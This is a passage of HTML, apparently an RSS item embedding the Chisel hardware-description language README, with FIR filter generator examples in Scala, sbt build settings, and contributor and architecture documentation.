  <span>val</span> <span>io</span> <span>=</span> <span>IO</span>(<span>new</span> <span>Bundle</span> {
    <span>val</span> <span>in</span> <span>=</span> <span>Input</span>(<span>UInt</span>(bitWidth.<span>W</span>))
    <span>val</span> <span>out</span> <span>=</span> <span>Output</span>(<span>UInt</span>(bitWidth.<span>W</span>))
  })

  <span>val</span> <span>z1</span> <span>=</span> <span>RegNext</span>(io.in)
  <span>val</span> <span>z2</span> <span>=</span> <span>RegNext</span>(z1)

  io.out <span>:</span><span>=</span> (io.in <span>*</span> <span>1</span>.<span>U</span>) <span>+</span> (z1 <span>*</span> <span>1</span>.<span>U</span>) <span>+</span> (z2 <span>*</span> <span>1</span>.<span>U</span>)
}</pre></div>
<p dir="auto">the power of Chisel comes from the ability to create generators, such as an FIR filter that is defined by the list of coefficients:</p>
<div dir="auto" data-snippet-clipboard-copy-content="// Generalized FIR filter parameterized by the convolution coefficients
class FirFilter(bitWidth: Int, coeffs: Seq[UInt]) extends Module {
  val io = IO(new Bundle {
    val in = Input(UInt(bitWidth.W))
    val out = Output(UInt(bitWidth.W))
  })
  // Create the serial-in, parallel-out shift register
  val zs = Reg(Vec(coeffs.length, UInt(bitWidth.W)))
  zs(0) := io.in
  for (i <- 1 until coeffs.length) {
    zs(i) := zs(i-1)
  }

  // Do the multiplies
  val products = VecInit.tabulate(coeffs.length)(i => zs(i) * coeffs(i))

  // Sum up the products
  io.out := products.reduce(_ + _)
}"><pre><span><span>//</span> Generalized FIR filter parameterized by the convolution coefficients</span>
class <span>FirFilter</span>(<span>bitWidth</span>: <span>Int</span>, <span>coeffs</span>: <span>Seq</span>[<span>UInt</span>]) <span>extends</span> <span>Module</span> {
  <span>val</span> <span>io</span> <span>=</span> <span>IO</span>(<span>new</span> <span>Bundle</span> {
    <span>val</span> <span>in</span> <span>=</span> <span>Input</span>(<span>UInt</span>(bitWidth.<span>W</span>))
    <span>val</span> <span>out</span> <span>=</span> <span>Output</span>(<span>UInt</span>(bitWidth.<span>W</span>))
  })
  <span><span>//</span> Create the serial-in, parallel-out shift register</span>
  <span>val</span> <span>zs</span> <span>=</span> <span>Reg</span>(<span>Vec</span>(coeffs.length, <span>UInt</span>(bitWidth.<span>W</span>)))
  zs(<span>0</span>) <span>:</span><span>=</span> io.in
  <span>for</span> (i <span>&lt;</span><span>-</span> <span>1</span> until coeffs.length) {
    zs(i) <span>:</span><span>=</span> zs(i<span>-</span><span>1</span>)
  }

  <span><span>//</span> Do the multiplies</span>
  <span>val</span> <span>products</span> <span>=</span> <span>VecInit</span>.tabulate(coeffs.length)(i <span>=&gt;</span> zs(i) <span>*</span> coeffs(i))

  <span><span>//</span> Sum up the products</span>
  io.out <span>:</span><span>=</span> products.reduce(_ <span>+</span> _)
}</pre></div>
<p dir="auto">and use and re-use them across designs:</p>
<div dir="auto" data-snippet-clipboard-copy-content="val movingSum3Filter = Module(new FirFilter(8, Seq(1.U, 1.U, 1.U)))  // same 3-point moving sum filter as before
val delayFilter = Module(new FirFilter(8, Seq(0.U, 1.U)))  // 1-cycle delay as a FIR filter
val triangleFilter = Module(new FirFilter(8, Seq(1.U, 2.U, 3.U, 2.U, 1.U)))  // 5-point FIR filter with a triangle impulse response"><pre><span>val</span> <span>movingSum3Filter</span> <span>=</span> <span>Module</span>(<span>new</span> <span>FirFilter</span>(<span>8</span>, <span>Seq</span>(<span>1</span>.<span>U</span>, <span>1</span>.<span>U</span>, <span>1</span>.<span>U</span>)))  <span><span>//</span> same 3-point moving sum filter as before</span>
val delayFilter <span>=</span> <span>Module</span>(<span>new</span> <span>FirFilter</span>(<span>8</span>, <span>Seq</span>(<span>0</span>.<span>U</span>, <span>1</span>.<span>U</span>)))  <span><span>//</span> 1-cycle delay as a FIR filter</span>
val triangleFilter <span>=</span> <span>Module</span>(<span>new</span> <span>FirFilter</span>(<span>8</span>, <span>Seq</span>(<span>1</span>.<span>U</span>, <span>2</span>.<span>U</span>, <span>3</span>.<span>U</span>, <span>2</span>.<span>U</span>, <span>1</span>.<span>U</span>)))  <span><span>//</span> 5-point FIR filter with a triangle impulse response</span></pre></div>
<p dir="auto">The above can be converted to Verilog using <code>ChiselStage</code>:</p>
<div dir="auto" data-snippet-clipboard-copy-content="import chisel3.stage.ChiselGeneratorAnnotation
import circt.stage.{ChiselStage, FirtoolOption}

(new ChiselStage).execute(
  Array(&quot;--target&quot;, &quot;systemverilog&quot;),
  Seq(ChiselGeneratorAnnotation(() => new FirFilter(8, Seq(1.U, 1.U, 1.U))),
    FirtoolOption(&quot;--disable-all-randomization&quot;))
)"><pre><span>import</span> <span>chisel3</span>.<span>stage</span>.<span>ChiselGeneratorAnnotation</span>
<span>import</span> <span>circt</span>.<span>stage</span>.{<span>ChiselStage</span>, <span>FirtoolOption</span>}

(<span>new</span> <span>ChiselStage</span>).execute(
  <span>Array</span>(<span><span>"</span>--target<span>"</span></span>, <span><span>"</span>systemverilog<span>"</span></span>),
  <span>Seq</span>(<span>ChiselGeneratorAnnotation</span>(() <span>=&gt;</span> <span>new</span> <span>FirFilter</span>(<span>8</span>, <span>Seq</span>(<span>1</span>.<span>U</span>, <span>1</span>.<span>U</span>, <span>1</span>.<span>U</span>))),
    <span>FirtoolOption</span>(<span><span>"</span>--disable-all-randomization<span>"</span></span>))
)</pre></div>
<p dir="auto">Alternatively, you may generate some Verilog directly for inspection:</p>
<div dir="auto" data-snippet-clipboard-copy-content="val verilogString = chisel3.getVerilogString(new FirFilter(8, Seq(0.U, 1.U)))
println(verilogString)"><pre><span>val</span> <span>verilogString</span> <span>=</span> chisel3.getVerilogString(<span>new</span> <span>FirFilter</span>(<span>8</span>, <span>Seq</span>(<span>0</span>.<span>U</span>, <span>1</span>.<span>U</span>)))
println(verilogString)</pre></div>
<h2 tabindex="-1" dir="auto">Getting Started</h2>
<h3 tabindex="-1" dir="auto">Bootcamp Interactive Tutorial</h3>
<p dir="auto">The <a href="https://mybinder.org/v2/gh/freechipsproject/chisel-bootcamp/master" rel="nofollow"><strong>online Chisel Bootcamp</strong></a> is the recommended way to get started with and learn Chisel.
<strong>No setup is required</strong> (it runs in the browser), nor does it assume any prior knowledge of Scala.</p>
<p dir="auto">The <a href="https://github.com/ucb-bar/chisel-tutorial"><strong>classic Chisel tutorial</strong></a> contains small exercises and runs on your computer.</p>
<h3 tabindex="-1" dir="auto">A Textbook on Chisel</h3>
<p dir="auto">If you like a textbook to learn Chisel and also a bit of digital design in general, you may be interested in reading <a href="http://www.imm.dtu.dk/~masca/chisel-book.html" rel="nofollow"><strong>Digital Design with Chisel</strong></a>. It is available in English, Chinese, Japanese, and Vietnamese.</p>
<h3 tabindex="-1" dir="auto">Build Your Own Chisel Projects</h3>
<p dir="auto">See <a href="https://github.com/chipsalliance/chisel/blob/main/SETUP.md">the setup instructions</a> for how to set up your environment to build Chisel locally.</p>
<p dir="auto">When you're ready to build your own circuits in Chisel, <strong>we recommend starting from the <a href="https://github.com/freechipsproject/chisel-template">Chisel Template</a> repository</strong>, which provides a pre-configured project, example design, and testbench.
Follow the <a href="https://github.com/freechipsproject/chisel-template">chisel-template README</a> to get started.</p>
<p dir="auto">If you insist on setting up your own project from scratch, your project needs to depend on both the chisel-plugin (Scalac plugin) and the chisel library.
For example, in SBT this could be expressed as:</p>
<div dir="auto" data-snippet-clipboard-copy-content="// build.sbt
scalaVersion := &quot;2.13.10&quot;
val chiselVersion = &quot;5.1.0&quot;
addCompilerPlugin(&quot;org.chipsalliance&quot; % &quot;chisel-plugin&quot; % chiselVersion cross CrossVersion.full)
libraryDependencies += &quot;org.chipsalliance&quot; %% &quot;chisel&quot; % chiselVersion"><pre><span><span>//</span> build.sbt</span>
scalaVersion <span>:</span><span>=</span> <span><span>"</span>2.13.10<span>"</span></span>
<span>val</span> <span>chiselVersion</span> <span>=</span> <span><span>"</span>5.1.0<span>"</span></span>
addCompilerPlugin(<span><span>"</span>org.chipsalliance<span>"</span></span> <span>%</span> <span><span>"</span>chisel-plugin<span>"</span></span> <span>%</span> chiselVersion cross <span>CrossVersion</span>.full)
libraryDependencies <span>+</span><span>=</span> <span><span>"</span>org.chipsalliance<span>"</span></span> <span>%%</span> <span><span>"</span>chisel<span>"</span></span> <span>%</span> chiselVersion</pre></div>
<p dir="auto">For Chisel prior to v5.0.0, Chisel was published using a different artifact name:</p>
<div dir="auto" data-snippet-clipboard-copy-content="// build.sbt
scalaVersion := &quot;2.13.10&quot;
addCompilerPlugin(&quot;edu.berkeley.cs&quot; % &quot;chisel3-plugin&quot; % &quot;3.6.0&quot; cross CrossVersion.full)
libraryDependencies += &quot;edu.berkeley.cs&quot; %% &quot;chisel3&quot; % &quot;3.6.0&quot;
// We also recommend using chiseltest for writing unit tests
libraryDependencies += &quot;edu.berkeley.cs&quot; %% &quot;chiseltest&quot; % &quot;0.6.0&quot; % &quot;test&quot;"><pre><span><span>//</span> build.sbt</span>
scalaVersion <span>:</span><span>=</span> <span><span>"</span>2.13.10<span>"</span></span>
addCompilerPlugin(<span><span>"</span>edu.berkeley.cs<span>"</span></span> <span>%</span> <span><span>"</span>chisel3-plugin<span>"</span></span> <span>%</span> <span><span>"</span>3.6.0<span>"</span></span> cross <span>CrossVersion</span>.full)
libraryDependencies <span>+</span><span>=</span> <span><span>"</span>edu.berkeley.cs<span>"</span></span> <span>%%</span> <span><span>"</span>chisel3<span>"</span></span> <span>%</span> <span><span>"</span>3.6.0<span>"</span></span>
<span><span>//</span> We also recommend using chiseltest for writing unit tests</span>
libraryDependencies <span>+</span><span>=</span> <span><span>"</span>edu.berkeley.cs<span>"</span></span> <span>%%</span> <span><span>"</span>chiseltest<span>"</span></span> <span>%</span> <span><span>"</span>0.6.0<span>"</span></span> <span>%</span> <span><span>"</span>test<span>"</span></span></pre></div>
<h3 tabindex="-1" dir="auto">Guide For New Contributors</h3>
<p dir="auto">If you are trying to make a contribution to this project, please read <a href="https://github.com/chipsalliance/chisel/blob/master/CONTRIBUTING.md">CONTRIBUTING.md</a></p>
<h3 tabindex="-1" dir="auto">Design Verification</h3>
<p dir="auto">These simulation-based verification tools are available for Chisel:</p>
<ul dir="auto">
<li><a href="https://github.com/chipsalliance/chisel/blob/main/svsim"><strong>svsim</strong></a> is the lightweight testing library for Chisel, included in this repository.</li>
<li><a href="https://github.com/ucb-bar/chiseltest"><strong>chiseltest (Chisel 5.0 and before)</strong></a> is the batteries-included testing and formal verification library for Chisel-based RTL designs and a replacement for the former PeekPokeTester, providing the same base constructs but with a streamlined interface and concurrency support with <code>fork</code> and <code>join</code> with internal and Verilator integration for simulations.</li>
</ul>
<h2 tabindex="-1" dir="auto">Documentation</h2>
<h3 tabindex="-1" dir="auto">Useful Resources</h3>
<ul dir="auto">
<li><a href="https://github.com/freechipsproject/chisel-cheatsheet/releases/latest/download/chisel_cheatsheet.pdf"><strong>Cheat Sheet</strong></a>, a 2-page reference of the base Chisel syntax and libraries</li>
<li><a href="https://www.chisel-lang.org/api/latest/index.html" rel="nofollow"><strong>ScalaDoc (latest)</strong></a>, a listing, description, and examples of the functionality exposed by Chisel, <a href="https://www.chisel-lang.org/api/" rel="nofollow">older versions</a> are also available</li>
<li><a href="https://gitter.im/freechipsproject/chisel3" rel="nofollow"><strong>Gitter</strong></a>, where you can ask questions or discuss anything Chisel</li>
<li><a href="https://www.chisel-lang.org/" rel="nofollow"><strong>Website (3.6 and earlier)</strong></a> (<a href="https://github.com/freechipsproject/www.chisel-lang.org/">source</a>)</li>
<li><a href="https://chipsalliance.github.io/chisel" rel="nofollow"><strong>Website (main)</strong></a> (<a href="https://github.com/chipsalliance/chisel/blob/main/website">source</a>) (Note that this will replace the above after the Chisel 5 release)</li>
<li><a href="https://scastie.scala-lang.org/FfHRZUF4QuiD7PHTQoWINQ" rel="nofollow"><strong>Scastie (v5.1.0)</strong></a> - cannot generate Verilog (firtool does not work in Scastie)</li>
<li><a href="https://scastie.scala-lang.org/1XICrlaZQs6ZvxpuKdFdDw" rel="nofollow"><strong>Scastie (v3.6.0)</strong></a> - generates Verilog with legacy Scala FIRRTL Compiler</li>
<li><a href="http://www.asic-world.com/verilog/veritut.html" rel="nofollow"><strong>asic-world</strong></a> If you aren't familiar with verilog, this is a good tutorial.</li>
</ul>
<p dir="auto">If you are migrating from Chisel2, see <a href="https://www.chisel-lang.org/chisel3/docs/appendix/chisel3-vs-chisel2.html" rel="nofollow">the migration guide</a>.</p>
<h3 tabindex="-1" dir="auto">Chisel Dev Meeting</h3>
<p dir="auto">Chisel/FIRRTL development meetings happen every Monday from 9:00-10:00 am PT.</p>
<p dir="auto">Call-in info and meeting notes are available <a href="https://docs.google.com/document/d/1BLP2DYt59DqI-FgFCcjw8Ddl4K-WU0nHmQu0sZ_wAGo/" rel="nofollow">here</a>.</p>
<h3 tabindex="-1" dir="auto">Data Types Overview</h3>
<p dir="auto">These are the base data types for defining circuit components:</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/chipsalliance/chisel/master/docs/src/images/type_hierarchy.svg?sanitize=true"><img src="https://raw.githubusercontent.com/chipsalliance/chisel/master/docs/src/images/type_hierarchy.svg?sanitize=true" alt="Image"></a></p>
<h2 tabindex="-1" dir="auto">Contributor Documentation</h2>
<p dir="auto">This section describes how to get started contributing to Chisel itself, including how to test your version locally against other projects that pull in Chisel using <a href="https://www.scala-sbt.org/1.x/docs/Library-Dependencies.html" rel="nofollow">sbt's managed dependencies</a>.</p>
<h3 tabindex="-1" dir="auto">Useful Resources for Contributors</h3>
<p dir="auto">The <a href="#useful-resources">Useful Resources</a> for users are also helpful for contributors.</p>
<ul dir="auto">
<li><a href="https://docs.google.com/presentation/d/1gMtABxBEDFbCFXN_-dPyvycNAyFROZKwk-HMcnxfTnU/edit?usp=sharing" rel="nofollow"><strong>Chisel Breakdown Slides</strong></a>, an introductory talk about Chisel's internals</li>
</ul>
<h3 tabindex="-1" dir="auto">Compiling and Testing Chisel</h3>
<p dir="auto">You must first install required dependencies to build Chisel locally, please see <a href="https://github.com/chipsalliance/chisel/blob/main/SETUP.md">the setup instructions</a>.</p>
<p dir="auto">Clone and build the Chisel library:</p>
<div dir="auto" data-snippet-clipboard-copy-content="git clone https://github.com/chipsalliance/chisel.git
cd chisel
sbt compile"><pre>git clone https://github.com/chipsalliance/chisel.git
<span>cd</span> chisel
sbt compile</pre></div>
<p dir="auto">In order to run the following unit tests, you will need several tools on your <code>PATH</code>, namely
<a href="https://github.com/llvm/circt/releases/tag/firtool-1.43.0">firtool</a>,
<a href="https://www.veripool.org/verilator/" rel="nofollow">verilator</a>,
<a href="https://yosyshq.net/yosys/" rel="nofollow">yosys</a>,
and <a href="https://github.com/chipsalliance/espresso">espresso</a>.
Check that each is installed on your <code>PATH</code> by running <code>which verilator</code> and so on.</p>
<p dir="auto">If the compilation succeeded and the dependencies noted above are installed, you can then run the included unit tests by invoking:</p>

<h3 tabindex="-1" dir="auto">Running Projects Against Local Chisel</h3>
<p dir="auto">To use the development version of Chisel (<code>master</code> branch), you will need to build from source and publish locally.
The repository version can be found by running <code>sbt version</code>.
As of the time of writing it was: <code>6.0.0-M3+131-ca74d07e-SNAPSHOT</code>.</p>
<p dir="auto">To publish your version of Chisel to the local Ivy (sbt's dependency manager) repository, run:</p>
<div dir="auto" data-snippet-clipboard-copy-content="sbt &quot;unipublish / publishLocal&quot;"><pre>sbt <span><span>"</span>unipublish / publishLocal<span>"</span></span></pre></div>
<p dir="auto">The compiled version gets placed in <code>~/.ivy2/local/org.chipsalliance/</code>.
If you need to un-publish your local copy of Chisel, remove the directory generated in <code>~/.ivy2/local/org.chipsalliance/</code>.</p>
<p dir="auto">In order to have your projects use this version of Chisel, you should update the <code>libraryDependencies</code> setting in your project's build.sbt file to use the current version, for example:</p>
<div dir="auto" data-snippet-clipboard-copy-content="val chiselVersion = &quot;6.0.0-M3+131-ca74d07e-SNAPSHOT&quot;
addCompilerPlugin(&quot;org.chipsalliance&quot; % &quot;chisel-plugin&quot; % chiselVersion cross CrossVersion.full)
libraryDependencies += &quot;org.chipsalliance&quot; %% &quot;chisel&quot; % chiselVersion"><pre><span>val</span> <span>chiselVersion</span> <span>=</span> <span><span>"</span>6.0.0-M3+131-ca74d07e-SNAPSHOT<span>"</span></span>
addCompilerPlugin(<span><span>"</span>org.chipsalliance<span>"</span></span> <span>%</span> <span><span>"</span>chisel-plugin<span>"</span></span> <span>%</span> chiselVersion cross <span>CrossVersion</span>.full)
libraryDependencies <span>+</span><span>=</span> <span><span>"</span>org.chipsalliance<span>"</span></span> <span>%%</span> <span><span>"</span>chisel<span>"</span></span> <span>%</span> chiselVersion</pre></div>
<h3 tabindex="-1" dir="auto">Chisel Architecture Overview</h3>
<p dir="auto">The Chisel compiler consists of these main parts:</p>
<ul dir="auto">
<li><strong>The frontend</strong>, <code>chisel3.*</code>, which is the publicly visible "API" of Chisel and what is used in Chisel RTL. These just add data to the...</li>
<li><strong>The Builder</strong>, <code>chisel3.internal.Builder</code>, which maintains global state (like the currently open Module) and contains commands, generating...</li>
<li><strong>The intermediate data structures</strong>, <code>chisel3.firrtl.*</code>, which are syntactically very similar to Firrtl. Once the entire circuit has been elaborated, the top-level object (a <code>Circuit</code>) is then passed to...</li>
<li><strong>The Firrtl emitter</strong>, <code>chisel3.firrtl.Emitter</code>, which turns the intermediate data structures into a string that can be written out into a Firrtl file for further processing.</li>
</ul>
<p dir="auto">Also included is:</p>
<ul dir="auto">
<li><strong>The standard library</strong> of circuit generators, <code>chisel3.util.*</code>. These contain commonly used interfaces and constructors (like <code>Decoupled</code>, which wraps a signal with a ready-valid pair) as well as fully parameterizable circuit generators (like arbiters and multiplexors).</li>
<li><strong>Chisel Stage</strong>, <code>chisel3.stage.*</code>, which contains compilation and test functions that are invoked in the standard Verilog generation and simulation testing infrastructure. These can also be used as part of custom flows.</li>
</ul>
<h3 tabindex="-1" dir="auto">Chisel Sub-Projects</h3>
<p dir="auto">Chisel consists of several Scala projects; each is its own separate compilation unit:</p>
<ul dir="auto">
<li><a href="https://github.com/chipsalliance/chisel/blob/main/core"><code>core</code></a> is the bulk of the source code of Chisel, depends on <code>firrtl</code>, <code>svsim</code>, and <code>macros</code></li>
<li><a href="https://github.com/chipsalliance/chisel/blob/main/firrtl"><code>firrtl</code></a> is the vestigial remains of the old Scala FIRRTL compiler, much if it will likely be absorbed into <code>core</code></li>
<li><a href="https://github.com/chipsalliance/chisel/blob/main/macros"><code>macros</code></a> is most of the macros used in Chisel, no internal dependencies</li>
<li><a href="https://github.com/chipsalliance/chisel/blob/main/plugin"><code>plugin</code></a> is the compiler plugin, no internal dependencies</li>
<li><a href="https://github.com/chipsalliance/chisel/blob/main/src/main"><code>src/main</code></a> is the "main" that brings it all together and includes a <a href="https://github.com/chipsalliance/chisel/blob/main/src/main/scala/chisel3/util"><code>util</code></a> library, which depends on <code>core</code></li>
<li><a href="https://github.com/chipsalliance/chisel/blob/main/svsim"><code>svsim</code></a> is a low-level library for compiling and controlling SystemVerilog simulations, currently targeting Verilator and VCS as backends</li>
</ul>
<p dir="auto">Code that touches lots of APIs that are private to the <code>chisel3</code> package should belong in <code>core</code>, while code that is pure Chisel should belong in <code>src/main</code>.</p>
<h3 tabindex="-1" dir="auto">Which version should I use?</h3>
<p dir="auto">We encourage Chisel users (as opposed to Chisel developers), to use the latest release version of Chisel.
This <a href="https://github.com/freechipsproject/chisel-template">chisel-template</a> repository is kept up-to-date, depending on the most recent version of Chisel.
The recommended version is also captured near the top of this README, and in the <a href="https://github.com/chipsalliance/chisel/releases">Github releases</a> section of this repo.
If you encounter an issue with a released version of Chisel, please file an issue on GitHub mentioning the Chisel version and provide a simple test case (if possible).
Try to reproduce the issue with the associated latest minor release (to verify that the issue hasn't been addressed).</p>
<p dir="auto">For more information on our versioning policy and what versions of the various Chisel ecosystem projects work together, see <a href="https://www.chisel-lang.org/chisel3/docs/appendix/versioning.html" rel="nofollow">Chisel Project Versioning</a>.</p>
<p dir="auto">If you're developing a Chisel library (or <code>chisel3</code> itself), you'll probably want to work closer to the tip of the development trunk.
By default, the main branch of the chisel repository is configured to build and publish its version of the code as <code>&lt;version&gt;+&lt;n&gt;-&lt;commit hash&gt;-SNAPSHOT</code>.
Updated SNAPSHOTs are publised on every push to main.
You are encouraged to do your development against the latest SNAPSHOT, but note that neither API nor ABI compatibility is guaranteed so your code may break at any time.</p>
<h3 tabindex="-1" dir="auto">Roadmap</h3>
<p dir="auto">See <a href="https://github.com/chipsalliance/chisel3/blob/master/ROADMAP.md">Roadmap</a>.</p>
</article>
          </div></div>]]></description>
        </item>
    </channel>
</rss>